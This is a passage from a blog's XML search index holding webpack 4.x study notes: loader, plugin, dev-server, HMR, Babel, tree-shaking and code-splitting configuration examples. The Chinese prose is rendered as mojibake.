å°åž‹ç¼–è¯‘å™¨ï¼Œè¿™ä»½èµ„æ–™å‘Šè¯‰äº†æˆ‘ä»¬è¯¥å¦‚ä½•åŽ»å®žçŽ°ä¸€ä¸ªå°åž‹çš„ç¼–è¯‘å™¨ï¼Œå¾ˆé€‚åˆå‰ç«¯å¼€å‘è€…é˜…è¯»ã€‚ every-programmer-should-knowï¼Œè¿™ä»½èµ„æ–™åˆ—ä¸¾äº†å¾ˆå¤šæ¯ä¸ªå¼€å‘è€…éƒ½åº”è¯¥çŸ¥é“çš„çŸ¥è¯†ç‚¹ã€‚]]></content>
      <categories>
        <category>å‰ç«¯é¢è¯•</category>
      </categories>
      <tags>
        <tag>å‰ç«¯é¢è¯•é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpack4.xä»ŽåŸºç¡€åˆ°å®žæˆ˜]]></title>
    <url>%2F2019-04-13-webpack4x%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98.html</url>
    <content type="text"><![CDATA[DellLee è€å¸ˆçš„ webpack å­¦ä¹ ä¸Žè®°å½• çŸ¥è¯†ç‚¹ï¼š Loader HMR Create React App Caching Plugin SourceMap Vue Cli 3.0 Shimming WebpackDevServer TreeShaking CodeSplitting Babel React Library Eslint PWA Vue Mode æ€§èƒ½ä¼˜åŒ– å¤šé¡µåº”ç”¨ åŽŸç† PreLoading PreFetching çŽ¯å¢ƒå˜é‡ TypeScript Webpack æ˜¯ä»€ä¹ˆæœ¬è´¨ä¸Šï¼Œwebpack æ˜¯ä¸€ä¸ªçŽ°ä»£ JavaScript åº”ç”¨ç¨‹åºçš„é™æ€æ¨¡å—æ‰“åŒ…å™¨(module bundler)ã€‚å½“ webpack å¤„ç†åº”ç”¨ç¨‹åºæ—¶ï¼Œå®ƒä¼šé€’å½’åœ°æž„å»ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾(dependency graph)ï¼Œå…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—ï¼Œç„¶åŽå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundleã€‚ æ‰©å±•é˜…è¯»-Modules webapack æ‰“åŒ…æµ…æž1234567891011const path = require('path');module.exports = &#123; // production æ¨¡å¼ä¸‹ä»£ç åŽ‹ç¼©ï¼Œdevelopment ä»£ç ä¸åŽ‹ç¼© mode: 'production', entry: './src/index.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125; Loadermodule å¤„ç†æ–¹æ¡ˆï¼Œloader æœ‰å…ˆåŽé¡ºåºï¼Œä»Žä¸‹åˆ°ä¸Šï¼Œä»Žå³åˆ°å·¦ file-loaderå¤„ç†å›¾ç‰‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566module.exports = &#123; // å¼€å‘è¿˜æ˜¯ç”Ÿäº§çŽ¯å¢ƒ mode: 'production', // è¿›å£ entry: './src/index.js', // æ¨¡å—å¤„ç† module: &#123; // è§„åˆ™ rules: [&#123; // åŒ¹é… test: /\.jpg$/, // loader è¿ç”¨ use: &#123; loader: 'file-loader', // å ä½ç¬¦ options: &#123; // å®šä¹‰æ–‡ä»¶çš„åå­—ï¼šåŽŸæ¥çš„åå­—_å“ˆå¸Œå€¼.åŽŸæ¥çš„åŽç¼€ name: '[name]_[hash].[ext]', // å›¾ç‰‡è¾“å‡ºè·¯å¾„ outputPath:'./images/' &#125; &#125; &#125;] &#125;, // è¾“å‡º output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125;// æˆ–è€…æ˜¯ç”¨æ–¹æ³•çš„æ–¹å¼module.exports = &#123; // å¼€å‘è¿˜æ˜¯ç”Ÿäº§çŽ¯å¢ƒ mode: 'production', // è¿›å£ entry: './src/index.js', // æ¨¡å—å¤„ç† module: &#123; // è§„åˆ™ rules: [&#123; // åŒ¹é… test: /\.jpg$/, // loader è¿ç”¨ use: &#123; loader: 'file-loader', // å ä½ç¬¦ options: &#123; // å®šä¹‰æ–‡ä»¶çš„åå­—ï¼šåŽŸæ¥çš„åå­—_å“ˆå¸Œå€¼.åŽŸæ¥çš„åŽç¼€ name(file)&#123; if(process.env.NODE_ENV === 'development')&#123; return '[path][name].[ext]', &#125; return '[hash][ext]' &#125;, // å›¾ç‰‡è¾“å‡ºè·¯å¾„ outputPath:'./images/' &#125; &#125; &#125;] &#125;, // è¾“å‡º output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125; url-loaderä¼šæŠŠå›¾ç‰‡æ‰“åŒ…åˆ°js æ–‡ä»¶ä¸­ï¼Œå¦‚æžœå›¾ç‰‡å¾ˆå°ï¼ˆ1-2kbï¼‰çš„è¯å°±é€‚åˆä»¥base64çš„å½¢å¼æ‰“åŒ…åˆ°jsé‡Œé¢ 12345678910111213141516171819202122module.exports = &#123; mode: 'development', entry: './src/index.js', module: &#123; rules: [&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', // é™åˆ¶å›¾ç‰‡çš„å¤§å°ï¼ˆKbï¼‰,å°äºŽçš„ä¼šè¢«æ‰“åŒ…åˆ°jsé‡Œé¢ï¼Œå¤§äºŽåˆ™æ‰“åŒ…åˆ°æŒ‡å®šç›®å½•ä¸‹ limit: 2048 &#125; &#125; &#125;] &#125;, output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'dist') &#125;&#125; ä¹Ÿå¯ä»¥ç”¨æ¥å¤„ç†å­—ä½“æ–‡ä»¶ 12345678module: &#123; rules: [&#123; test:/\.(eot|ttf|svg|woff)$/, use:&#123; loader:'file-loader' &#125; &#125;]&#125;, style-loaderã€css-loaderå¤„ç†css æ ·å¼ css-loader åˆ†æžæœ‰å‡ ä¸ªcssæ–‡ä»¶ä»¥åŠå®ƒä»¬ä¹‹é—´çš„å…³ç³»æ˜¯æ€Žä¹ˆæ ·çš„ç„¶åŽåˆå¹¶ä¸ºä¸€ä¸ªcss style-loader ä¼šæŠŠ css-loader åˆå¹¶çš„å†…å®¹æŒ‚è½½åˆ°é¡µé¢ä¸Š node-sassã€sass-loaderï¼šåº”å¯¹ sass æ–‡ä»¶ï¼Œä¸Šé¢çš„ç»„åˆå¤„ç†sass æ–‡ä»¶ä¸ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä¸ä¼šè½¬ä¹‰sass ç‰¹æ®Šçš„è¯­æ³• 123456module: &#123; rules: [ &#123; test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] &#125;]&#125;, postcss-loaderã€autoprefixerè‡ªåŠ¨æ·»åŠ csså‰ç¼€ åœ¨æ–‡ä»¶çš„æ ¹ç›®å½•é…ç½® postcss.config.js 12345module.exports = &#123; plugins:[ require('autoprefixer'), ]&#125; webapck.config.js æ›´æ”¹ 123456module: &#123; rules: [ &#123; test: /\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader','postcss-loader'] &#125;]&#125;, å¦‚æžœæœ‰æ ·å¼å¼•ç”¨å…¶ä»–æ ·å¼çš„æƒ…å†µè¦é‡æ–°å®šä¹‰ css-loader ä½¿å¾—è¢«å¼•å…¥çš„ scss ç­‰æœ‰è¯­ä¹‰çš„css æ–‡ä»¶å¯ä»¥é‡æ–°è·‘å¤šä¸€æ¬¡å…¨éƒ¨çš„ loader 123456789101112module: &#123; rules: [ &#123; test: /\.scss$/, // å½“ loader æœ‰å‚æ•°é…ç½®çš„æ—¶å€™ä½¿ç”¨å¯¹è±¡ use: ['style-loader', &#123; loader:'css-loader', options:&#123; importLoaders:2 &#125; &#125;, 'sass-loader','postcss-loader'] &#125;]&#125;, å¼€å¯æ¨¡å—åŒ–ï¼š 1234567891011121314module: &#123; rules: [ &#123; test: /\.scss$/, // å½“ loader æœ‰å‚æ•°é…ç½®çš„æ—¶å€™ä½¿ç”¨å¯¹è±¡ use: ['style-loader', &#123; loader:'css-loader', options:&#123; importLoaders:2, // css æ¨¡å—åŒ– modules:true &#125; &#125;, 'sass-loader','postcss-loader'] &#125;]&#125;, å…¶ä»–å…·ä½“çš„loader Pluginså¯ä»¥åœ¨webpack è¿è¡Œæ‰“åŒ…åˆ°æŸä¸ªæ—¶åˆ»å¸®ä½ å®žçŽ°ä¸€äº›äº‹æƒ… html-webpack-pluginä¼šåœ¨æ‰“åŒ…ç»“æŸåŽè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª html æ–‡ä»¶ï¼Œå¹¶æŠŠæ‰“åŒ…ç”Ÿæˆçš„ js è‡ªåŠ¨å¼•å…¥åˆ°è¿™ä¸ª html æ–‡ä»¶ä¸­ 123456module.exports = &#123; plugins: [new HtmlWebpackPlugin(&#123; // è®¾ç½®é»˜è®¤çš„æ¨¡æ¿ template: 'src/index.html' &#125;)]&#125; clean-webpack-pluginæ‰“åŒ…ä¹‹å‰åŽ»æŽ‰æ—§çš„dist é¡¹ç›® 1234plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin()], clean-webpack-plugin2.0 çš„æ–°å‚æ•° Outputã€Entryå¤šæ–‡ä»¶è¾“å‡ºé¢„è®¾çš„åå­— 123456789101112module.export = &#123; entry:&#123; main:'./src/index.js', sub:'./src/index.js' &#125;, output:&#123; // å¯ä»¥å®šä¹‰è¾“å‡ºçš„è·Ÿè·¯å¾„ï¼Œå¦‚æžœå›¾ç‰‡æ˜¯cdnä¸Šé¢çš„ï¼Œå¯ä»¥åœ¨ä»Žè¿™é‡Œè®¾ç½®ï¼Œhtml å¼•å…¥è¿™ä¸ªjsä¼šè‡ªåŠ¨åŠ ä¸Š publicPath:'xx', filename:'[name].js' path:path.resolve(__dirname,'dist') &#125;&#125; SouceMapdevelopment æ¨¡å¼ä¸‹ devtool é»˜è®¤æ˜¯true,å¼€å¯souceMap é€šè¿‡æ˜ å°„å½“ä»£ç å‡ºé”™çš„æ—¶å€™å¯ä»¥æ‰¾åˆ°æºæ–‡ä»¶æ˜¯å“ªé‡Œå‡ºé”™è€Œä¸æ˜¯ç¼–è¯‘åŽçš„æ–‡ä»¶å“ªé‡Œå‡ºé”™. å½“ç„¶å»ºç«‹è¿™ç§æ˜ å°„ä¼šå½±å“æ‰“åŒ…é€Ÿåº¦ å…·ä½“å†…å®¹ 12345678module.exports = &#123; mode: 'development', // è¿™é‡Œå¯ä»¥å…³é—­ sourceMapï¼Œå¼€å¯åˆ™æ˜¯'source-map' devtool: 'none', entry: &#123; main: './src/index.js' &#125;&#125; souce-mapä¼šåœ¨dist è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª js.map æ˜ å°„æ–‡ä»¶ï¼Œè€Œinline-souce-map åˆ™æ˜¯å°†è¿™ä¸ªå…³ç³»åŒ…å«åœ¨ æ‰“åŒ…çš„jsæ–‡ä»¶é‡Œé¢ã€‚ ä½¿ç”¨ cheap-xxxâ€“xxx çš„å‚æ•°ä¼šåŠ å¿«æ‰“åŒ…æ–¹å¼ï¼Œä½†æ˜¯åªä¼šæç¤ºåˆ°å‡ è¡Œä¸ä¼šç²¾ç¡®åˆ°å‡ åˆ—ã€‚ å¼€å‘çŽ¯å¢ƒï¼ˆdevelopmentï¼‰æŽ¨èä½¿ç”¨ï¼šcheap-module-eval-source-mapï¼ˆmoduleä»£è¡¨moduleé‡Œé¢çš„é”™è¯¯ä¹Ÿå¯ä»¥æ£€æµ‹åˆ°ï¼Œeval å¯ä»¥åŠ å¿«ç¼–è¯‘é€Ÿåº¦ï¼‰ ç”Ÿäº§çŽ¯å¢ƒï¼ˆpruductionï¼‰åˆ™æ˜¯ï¼šcheap-module-source-map WebpackDevServerwebpack-dev-server å¸®åŠ©æ‰“åŒ…åŽçš„è¿è¡Œåœ¨è‡ªåŠ¨æ‰“å¼€çš„æœåŠ¡å™¨ï¼Œå¹¶ä¼šè·Ÿéšæ–‡ä»¶çš„æ”¹å˜è€Œæ”¹å˜ 12345678910111213141516171819module.exports = &#123; devServer:&#123; // è¦æ‰“å¼€çš„æ–‡ä»¶åœ°å€ contentBase:'./dist', // æ˜¯å¦è‡ªåŠ¨æ‰“å¼€é»˜è®¤æµè§ˆå™¨ open:true, // ç«¯å£å·ï¼Œé»˜è®¤ç«¯å£æ˜¯8080 port:8080 &#125;&#125;// package.json&#123; "scripts": &#123; "start": "webpack-dev-server", "watch": "webpack --watch" &#125;,&#125; webpack-dev-server æ‰“åŒ…çš„æ—¶å€™ä¼šæŠŠæ‰“åŒ…çš„ dist ç›®å½•å†…ç½®åˆ°å†…å­˜é‡Œé¢è€Œä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œå¯ä»¥æé«˜ç¼–è¯‘é€Ÿåº¦ ç›¸å…³å†…å®¹ ä¸€å¼€å§‹çš„æ—¶å€™webpack-dev-server å› ä¸ºé…ç½®ä¸æ˜¯å¾ˆå®Œå–„ï¼Œä¸€èˆ¬äººéƒ½ä¼šè‡ªå·±åˆ›å»ºä¸€ä¸ª server.js æ–‡ä»¶æ¥è‡ªå·±å»ºä¸€ä¸ªæœåŠ¡å™¨ è¿™é‡Œä½¿ç”¨ express å’Œ webpack-dev-middleware æ¥å®žçŽ° 1234567891011121314151617181920212223const express = require('express');const webpack = require('webpack');// ä¸­é—´ä»¶å¯ä»¥ç›‘å¬ï¼Œéšç€é¡µé¢å†…å®¹çš„æ”¹å˜è€Œæ›´æ”¹const webpackDevMiddleware = require('webpack-dev-middleware');const config = require('./webpack.config.js');// ä½¿ç”¨ webpack çš„é…ç½®æ¥è¿”å›žä¸€ä¸ªç¼–è¯‘å™¨const complier = webpack(config);const app = express();app.use(webpackDevMiddleware(complier,&#123; publicPath:config.output.publicPath&#125;));app.listen(3000,()=&gt;&#123; console.log('server is running on port 3000');&#125;);// package.json&#123; "scripts": &#123; "middleware": "node server.js" &#125;,&#125; ä½†æ˜¯ä¸Šé¢çš„å†…å®¹æ˜¯æ²¡æœ‰å®žçŽ°æµè§ˆå™¨è‡ªåŠ¨åŠ è½½çš„ã€‚ Hot Module Replacement(HMR)çƒ­æ¨¡å—æ›´æ–°ï¼Œä¸åˆ·æ–°é¡µé¢ï¼Œé‡æ–°åŠ è½½cssæ–‡ä»¶ 1234567891011121314module.exports = &#123; devServer: &#123; contentBase: './dist', open: true, port: 8080, // å¯åŠ¨çƒ­æ¨¡å—åŠ è½½ hot: true, // å³ä¾¿ html ä¸ç”Ÿæ•ˆä¹Ÿä¸ä¼šè‡ªåŠ¨åˆ·æ–° hotOnly: true &#125;, plugins:[ new webpack.HotModuleReplacementPlugin() ]&#125; åªä¿®æ”¹å¯¹åº”çš„ js æ–‡ä»¶ 12345if(module.hot)&#123; module.hot.accept('./æ–‡ä»¶å.js',()=&gt;&#123; // è¿ç”¨é¡µé¢çš„å‡½æ•° &#125;)&#125; è€Œcss å¯¹åº”çš„ä»£ç æ˜¯åœ¨ css-loader é‡Œé¢åº•å±‚å®žçŽ°äº†ï¼Œæ‰€ä»¥ä¸ç”¨æ‰‹å†™ module.hot Babel å¤„ç† ES6 è¯­æ³•babel-loader ä¸Ž @babel-core(webpackä¸Ž babel æ¡¥æ¢) @babel/preset-env 123456789101112module.exports = &#123; module:&#123; rules:[&#123; text:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; presets:['@babel/preset-env'] &#125; &#125;] &#125;&#125; è¿™é‡Œå¯ä»¥å°† ES6 è¯­æ³•è½¬æ¢ä¸º ES5 è¯­æ³•ï¼Œä½†æ˜¯è¿˜ä¸å®Œå–„ï¼ŒæŽ¥ç€åœ¨index.jsé‡Œé¢ç›´æŽ¥å¼•å…¥ 12// index.jsimport '@babel/polyfill' @babel/polyfill å¯ä»¥è‡ªåŠ¨æ·»åŠ å†…å®¹å®žçŽ°å…¼å®¹ä½Žç‰ˆæœ¬çš„æµè§ˆå™¨ã€‚æ‰“åŒ…ä¹‹åŽä¼šå‘çŽ°æ‰“åŒ…çš„jsä¼šå¾ˆå¤§ï¼Œå› ä¸ºå®ƒæŠŠæ‰€æœ‰ä½Žç‰ˆæœ¬å¯èƒ½è¦å…¼å®¹çš„ä»£ç éƒ½å†™äº†è¿›åŽ»ï¼Œè€Œä¸æ˜¯æŒ‰éœ€è¦æ¥å¢žåŠ å†…å®¹ã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥é€šè¿‡é…ç½®æ¥è¾¾åˆ°æŒ‰éœ€ 1234567891011121314module.exports = &#123; module:&#123; rules:[&#123; text:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; presets:[['@babel/preset-env'],&#123; useBuiltIns:'usage' &#125;] &#125; &#125;] &#125;&#125; webpack è¿›è¡Œæ‰“åŒ…çš„æ—¶å€™å‘çŽ°ä¼šæŠ¥é”™ 1Module not found: Error: Can't resolve 'core-js/modules/es6.array.map' ä¹‹ç±»çš„é”™è¯¯ï¼Œé€šè¿‡æŸ¥é˜…å‘çŽ°è¦ä¸‹è½½ä¸€ä¸ª core-js çš„æ’ä»¶ä¾¿å¯ä»¥è§£å†³é—®é¢˜ï¼Œå…·ä½“å¯ä»¥æŸ¥çœ‹ core-js è€Œå½“ä½ ä½¿ç”¨è¿™ä¸ªæŒ‰éœ€åŠ è½½çš„æ—¶å€™ï¼Œå°±ä¼šæç¤ºä½ åŽ»æŽ‰æ–‡ä»¶ä¸­ import â€˜@babel/polyfillâ€™ ,å› ä¸ºä¼šè‡ªåŠ¨åŠ è½½ï¼Œå¦å¤–å¯ä»¥é…ç½®è¦å…¼å®¹çš„æµè§ˆå™¨ç‰ˆæœ¬æ¥åˆ¤æ–­éœ€è¦å¼•å…¥é‚£äº›å…¼å®¹ä»£ç  1234567891011121314151617module.exports = &#123; module:&#123; rules:[&#123; text:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; presets:[['@babel/preset-env'],&#123; useBuiltIns:'usage', targets:&#123; chrome:'67' &#125; &#125;] &#125; &#125;] &#125;&#125; è€Œä¸Šé¢çš„ç‰ˆæœ¬çš„è°·æ­Œæµè§ˆå™¨æ˜¯æ”¯æŒ ES6 è¯­æ³•çš„ï¼Œå› ä¸ºæ‰“åŒ…å‡ºæ¥çš„æ–‡ä»¶å°±ä¼šå¾ˆå°ã€‚å¯ä»¥çœ‹å‡ºæ¥ä¸Šé¢çš„æ–¹å¼æœ‰å¯èƒ½ä¼šå…¨å±€æ±¡æŸ“(é€‚åˆå°é¡¹ç›®)ï¼Œå¯ä»¥ä½¿ç”¨å¦å¤–ä¸€ç§æ–¹å¼åŽ»é…ç½®ï¼ˆé€‚åˆå¤šæ¨¡å—ï¼‰ 1234567891011121314151617module.exports = &#123; module:&#123; rules:[&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader', options:&#123; plugins:[['@babel/plugin-transform-runtime',&#123; corejs:2, helpers:true, regenerator:true, useESModules:false &#125;]] &#125; &#125;] &#125;&#125; é…ç½®ä¸Šé¢çš„å†…å®¹ä¹‹å‰éœ€è¦å®‰è£…ä»¥ä¸‹å‡ ä¸ªä¾èµ– 1npm i -D @babel/runtime @babel/plugin-transfrom-runtime @babel/runtime-corejs2 å…·ä½“å¯ä»¥æŸ¥çœ‹è¿™é‡Œ å¦å¤–å¯ä»¥æŠŠ babel-loader options é‡Œé¢çš„å†…å®¹æ”¾åœ¨ä¸€ä¸ªå•ç‹¬åä¸º .babelrc çš„æ–‡ä»¶ä¸­ 12345678910111213&#123; "plugins": [ [ "@babel/plugin-transform-runtime", &#123; "corejs": 2, "helpers": true, "regenerator": true, "useESModules": false &#125; ] ]&#125; æ‰“åŒ… React ä»£ç å®‰è£…ä¾èµ–åŒ… 1npm i -D @babel/preset-react é…ç½® .babelrc 12345678910111213141516&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "chrome": "67" &#125;, "useBuiltIns": "usage" &#125; ], [ "@babel/preset-react" ] ]&#125; è¿™é‡Œçš„é¡ºåºä¹Ÿæ˜¯ä»Žä¸‹å¾€ä¸Š å…·ä½“ç‚¹å‡»è¿™é‡Œ Tree Shakingdevelopment çŽ¯å¢ƒï¼ŒæŒ‰éœ€åŠ è½½ï¼Œåªæ”¯æŒ ES Module ï¼Œåº•å±‚æ˜¯ä¸€ä¸ªé™æ€å¼•å…¥å®žçŽ° 1234567891011121314// index.js åªå¼•å…¥ add çš„æ‰“åŒ…ç»“æžœ/*! exports provided: add, minus *//*! exports used: add */// é€šè¿‡ä¸‹é¢çš„é…ç½®// webpack.config.jsmodule.exports = &#123; optimization:true&#125;// package.json&#123; // å› ä¸ºåªæ˜¯å•çº¯å¼•å…¥ï¼ŒæŒ‚è½½åœ¨å…¨å±€è€Œä¸ç”¨åŽ»ä½¿ç”¨é‡Œé¢å…·ä½“çš„ï¼Œä»¥é˜²æ­¢è¢«åŽ»æŽ‰ï¼Œä½¿ç”¨è¿™ä¸ªå‚æ•°å¯ä»¥åšä¸€ä¸ªè¿‡æ»¤ä¸ä½œ tree Shaking "sideEffects":["@babel/polyi-fill","*.css"]&#125; production çŽ¯å¢ƒç”šè‡³éœ€è¦ optimization é…ç½®ï¼Œä¼šè‡ªåŠ¨é…ç½®ï¼Œä½†æ˜¯ package.json ä¸­çš„ sideEffects éœ€è¦ä¿ç•™ Development å’Œ Production æ¨¡å¼çš„åŒºåˆ†æ‰“åŒ…123456&#123; "scripts": &#123; "dev": "webpack-dev-server --config webpack.dev.js", "build": "webpack --config webpack.prod.js", &#125;,&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// webpack.dev.jsconst webpack = require('webpack');const path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', entry: &#123; main: './src/index.js' &#125;, devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true, hotOnly: true &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, // modules: true &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(), new webpack.HotModuleReplacementPlugin() ], optimization:&#123; usedExports:true &#125;, output: &#123; publicPath: '/', filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125;// webpack.prod.jsconst webpack = require('webpack');const path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; mode: 'production', devtool: 'cheap-module-source-map', entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, // modules: true &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(), ], output: &#123; publicPath: '/', filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125; å¯ä»¥çœ‹å‡ºä¸Šé¢æœ‰å¾ˆå¤šé‡å¤çš„ä»£ç ï¼Œå¯ä»¥è¿›è¡ŒæŠ½å–ä¼˜åŒ–ï¼Œç”¨ webpack-merge è¿›è¡Œåˆå¹¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889// webpack.common.jsconst path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, // modules: true &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(), ], output: &#123; publicPath: '/', filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125;// webpack.dev.jsconst webpack = require('webpack');const merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const devConfig = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true &#125;, plugins: [ new webpack.HotModuleReplacementPlugin() ], optimization:&#123; usedExports:true &#125;&#125;module.exports = merge(commonConfig,devConfig);// webpack.prod.jsconst merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const prodConfig = &#123; mode: 'production', devtool: 'cheap-module-source-map'&#125;module.exports = merge(commonConfig,prodConfig); Webpack å’Œ Code SplittingåŒæ­¥ä»£ç é‡åˆ°å…¬å…±ç±»åº“ï¼Œä¼šè‡ªåŠ¨æ‰“åŒ…å‡ºæ¥ä¸€ä¸ªæ–‡ä»¶ï¼Œä¾‹å¦‚ vendors~main.js 12345module.exports = &#123; splitChunks:&#123; chunks:'all' &#125;&#125; å¼‚æ­¥ä»£ç å®‰è£… babel-plugin-dynamic-import-webpack åŽåœ¨ .babelrc é‡Œé¢é…ç½®,è¿™ä¸ªæ’ä»¶ä¸æ˜¯å®˜æ–¹çš„ï¼Œæ‰€ä»¥ä¸æ”¯æŒé­”æ³•æ³¨é‡Š 1234567891011121314151617&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "chrome": "67" &#125;, "useBuiltIns": "usage" &#125; ], [ "@babel/preset-react" ] ], "plugins":["dynamic-import-webpack"]&#125; å®˜æ–¹çš„ @babel/plugin-syntax-dynamic-import å¯ä»¥æ”¯æŒé­”æœ¯æ³¨é‡Š é‡æ–°é…ç½® .babelrc 1234567891011121314151617&#123; "presets": [ [ "@babel/preset-env", &#123; "targets": &#123; "chrome": "67" &#125;, "useBuiltIns": "usage" &#125; ], [ "@babel/preset-react" ] ], "plugins":["@babel/plugin-syntax-dynamic-import"]&#125; webpack.common.js 12345678910module.exports = &#123; splitChunks:&#123; chunks:'all', cacheGroups:&#123; // å–æ¶ˆåå­—å‰é¢çš„é»˜è®¤åç§° vendors:false, default:false &#125; &#125;&#125; index.js 123456789101112// ä½¿ç”¨é­”æ³•æ³¨é‡Šfunction getComponent()&#123; return import(/* webpackChunkName:"lodash" */'lodash').then((&#123;default:_&#125;) =&gt;&#123; const element = document.createElement('div'); element.innerHTML = _.join(['Dell','Lee'],'_'); return element; &#125;)&#125;getComponent().then(element=&gt;&#123; document.body.appendChild(element);&#125;); æ‰“åŒ…ç¼–è¯‘ä¹‹åŽå°±å¯ä»¥çœ‹åˆ°å¼‚æ­¥å¼•å…¥çš„åº“è¢«è‡ªå·±å®šä¹‰çš„åå­—æ‰“åŒ…å‡ºæ¥äº† splitChunksPluginsé»˜è®¤é…ç½®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839module.exports = &#123; //... optimization: &#123; splitChunks: &#123; // åªå¯¹å¼‚æ­¥ä»£ç ç”Ÿæ•ˆ all åˆ™æ˜¯å…¨éƒ¨ä»£ç ï¼Œinintal åˆ™æ˜¯åŒæ­¥ä»£ç  chunks: 'async', // å¼•å…¥çš„æ¨¡å—/åŒ…/åº“ å¤§äºŽ 30kb åˆ™ä¼šä»£ç åˆ†å‰² minSize: 30000, // ä¼šå°è¯•å°† å¤§äºŽè¿™ä¸ªå°ºå¯¸çš„åº“é‡æ–°æ‹†åˆ†ä¸ºnä¸ª maxSize å¤§çš„åº“ï¼Œä½†æ˜¯ä¸€èˆ¬è¿™ä¸ªå‚æ•°ä¸ä¼šç”Ÿæ•ˆ maxSize: 0, // æ‰“åŒ…ç”Ÿæˆçš„åº“çš„æ¬¡æ•°å°‘äºŽ minChunksæ¬¡ åˆ™ä¸ä¼šåˆ†å‰² minChunks: 1, maxAsyncRequests: 5, maxInitialRequests: 3, // è‡ªåŠ¨ç”Ÿæˆçš„æ–‡ä»¶çš„ä¸­é—´ç¬¦ automaticNameDelimiter: '~', name: true, // é…åˆ cacheGroups ä½¿ç”¨ // ç¼“å­˜ç»„ cacheGroups: &#123; vendors: &#123; // å¦‚æžœå¼•å…¥çš„åº“åœ¨ 